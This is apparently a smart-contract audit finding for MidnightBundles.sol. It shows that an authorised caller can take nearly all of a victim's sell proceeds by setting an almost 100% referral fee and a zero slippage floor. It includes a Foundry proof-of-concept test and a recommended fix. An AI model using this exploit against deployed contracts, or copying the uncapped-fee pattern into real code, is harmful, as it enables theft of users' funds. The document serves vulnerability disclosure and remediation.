### Title
Authorized caller can drain seller proceeds via uncapped `referralFeePct` with `minSellerAssets = 0` bypass - (File: src/periphery/MidnightBundles.sol)

### Summary
In `supplyCollateralAndSellWithUnitsTarget`, both `referralFeePct` and `minSellerAssets` are caller-supplied parameters with no independent validation relative to each other. An attacker who is authorized by the victim on Midnight can call the function with `referralFeePct = WAD - 1`, `referralFeeRecipient = attacker`, and `minSellerAssets = 0`, causing nearly all sell proceeds to be transferred to the attacker while the victim's collateral is fully consumed.

### Finding Description
The reachable Solidity path is:

**Line 127** — authorization gate passes because `IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender)` is true (victim authorized attacker): [1](#0-0) 

**Line 128** — `referralFeePct = WAD - 1` satisfies `< WAD`, so `PctExceeded()` does not revert: [2](#0-1) 

**Lines 152–160** — `take` is called with `taker = victim`, filling sell offers and accumulating `filledSellerAssets` into the bundler (`address(this)`): [3](#0-2) 

**Lines 165–168** — fee and distribution logic: [4](#0-3) 

With `referralFeePct = WAD - 1`:
```
referralFeeAssets = filledSellerAssets * (WAD - 1) / WAD
                  ≈ filledSellerAssets  (leaves only ~1 wei per WAD)
```

The `SellerAssetsTooLow` guard on line 166 is:
```solidity
require(filledSellerAssets - referralFeeAssets >= minSellerAssets, SellerAssetsTooLow());
```
The attacker controls `minSellerAssets` (it is a plain function parameter), so they pass `0`. The check becomes `~0 >= 0`, which trivially passes.

Result: `referralFeeRecipient` (attacker) receives `≈ filledSellerAssets`; `receiver` (victim) receives `≈ 0`. The victim's collateral has been consumed by the sell and their debt has increased by `targetUnits`.

No other check in the function constrains the relationship between `referralFeePct` and `minSellerAssets`. The `collateralSupplies` array can be empty — the victim's pre-existing collateral on Midnight is sufficient.

### Impact Explanation
An attacker authorized by the victim can, in a single transaction, consume the victim's collateral via a sell, redirect nearly 100% of the loan-token proceeds to themselves via the referral fee mechanism, and leave the victim with near-zero net proceeds and full debt. The victim's position is left with increased debt and depleted collateral, potentially making it unhealthy.

### Likelihood Explanation
The precondition — victim has authorized attacker on Midnight — is realistic. Users routinely authorize bundler contracts, bots, or DeFi integrations via `setIsAuthorized`. Any such authorized address (including a malicious or compromised contract) can execute this exploit. The attack is repeatable as long as the authorization remains active and the victim has collateral. No oracle manipulation, admin access, or impossible state is required.

### Recommendation
Decouple the slippage protection from the caller. The `minSellerAssets` floor should be enforced **before** the referral fee is deducted — i.e., `filledSellerAssets >= minSellerAssets` — so that the taker's minimum is guaranteed regardless of the referral fee chosen by the caller. Additionally, impose a protocol-level cap on `referralFeePct` (e.g., a constant `MAX_REFERRAL_FEE_PCT` well below `WAD`) so that no caller, authorized or not, can set a fee that approaches 100%.

Concretely, change line 166 from:
```solidity
require(filledSellerAssets - referralFeeAssets >= minSellerAssets, SellerAssetsTooLow());
```
to:
```solidity
require(filledSellerAssets >= minSellerAssets, SellerAssetsTooLow());
```
and add before line 165:
```solidity
require(referralFeePct <= MAX_REFERRAL_FEE_PCT, PctExceeded());
```

### Proof of Concept
```solidity
function testReferralFeeExploit() public {
    uint256 units = 100e18;
    offers[0].maxUnits = units;

    // Victim (borrower) has collateral and authorizes attacker
    collateralize(market, borrower, units);
    vm.prank(borrower);
    midnight.setIsAuthorized(attacker, true, borrower);

    Take[] memory takes = new Take[](1);
    takes[0] = Take({offer: offers[0], units: units, ratifierData: hex""});

    uint256 attackerBalanceBefore = loanToken.balanceOf(attacker);

    // Attacker calls with referralFeePct = WAD-1, minSellerAssets = 0
    vm.prank(attacker);
    midnightBundles.supplyCollateralAndSellWithUnitsTarget(
        units,
        0,              // minSellerAssets = 0, bypasses slippage check
        borrower,       // taker = victim
        borrower,       // receiver = victim (doesn't matter)
        new CollateralSupply[](0),
        takes,
        WAD - 1,        // referralFeePct ≈ 100%
        attacker        // referralFeeRecipient = attacker
    );

    // Assert: attacker received ~all proceeds
    assertGt(loanToken.balanceOf(attacker) - attackerBalanceBefore, 0);
    // Assert: victim received ~0
    assertEq(loanToken.balanceOf(borrower), 0);  // or ~0 (1 wei per WAD)
    // Assert: victim's debt increased
    assertEq(midnight.debtOf(id, borrower), units);
    // Assert: bundler has no residual
    assertEq(loanToken.balanceOf(address(midnightBundles)), 0);
}
```

### Citations

**File:** src/periphery/MidnightBundles.sol (L127-127)
```text
        require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
```

**File:** src/periphery/MidnightBundles.sol (L128-128)
```text
        require(referralFeePct < WAD, PctExceeded());
```

**File:** src/periphery/MidnightBundles.sol (L152-160)
```text
            try IMidnight(MIDNIGHT)
                .take(
                    takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(this), address(0), ""
                ) returns (
                uint256, uint256 resSellerAssets
            ) {
                filledUnits += unitsToTake;
                filledSellerAssets += resSellerAssets;
            } catch {}
```

**File:** src/periphery/MidnightBundles.sol (L165-168)
```text
        uint256 referralFeeAssets = filledSellerAssets.mulDivDown(referralFeePct, WAD);
        require(filledSellerAssets - referralFeeAssets >= minSellerAssets, SellerAssetsTooLow());
        if (referralFeeAssets > 0) SafeTransferLib.safeTransfer(loanToken, referralFeeRecipient, referralFeeAssets);
        SafeTransferLib.safeTransfer(loanToken, receiver, filledSellerAssets - referralFeeAssets);
```
